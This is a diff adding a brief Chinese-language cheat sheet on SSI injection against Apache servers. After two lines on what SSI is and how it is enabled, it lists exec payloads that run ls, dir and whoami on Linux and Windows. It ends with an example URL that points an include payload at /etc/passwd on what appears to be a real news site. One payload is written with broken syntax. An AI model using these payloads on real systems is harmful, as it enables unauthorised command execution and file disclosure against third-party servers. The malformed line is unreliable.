@@ -1,0 +1,18 @@
+简介： 主要针对Apache 类  
+SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
+Apache默认是不支持SSI的，需要我们更改httpd.conf来进行配置。我这里以windows平台的Apache 2.0.x为例，
+打开conf目录下的httpd.conf文件，搜索“AddType text/html .shtml”。
+
+Linux： 
+<!--#exec cmd="ls" -->
+<--!exec cmd="ls ../"-->
+<!--#exec cmd="whoami" -->
+
+window：
+<!--#exec cmd="dir" -->
+<!--#exec cmd="whoami" -->
+
+
+例子： 
+http://hpc.ebn.co.kr/news/n_view.html?keys=<!--#include%20file="/etc/passwd"-->
+
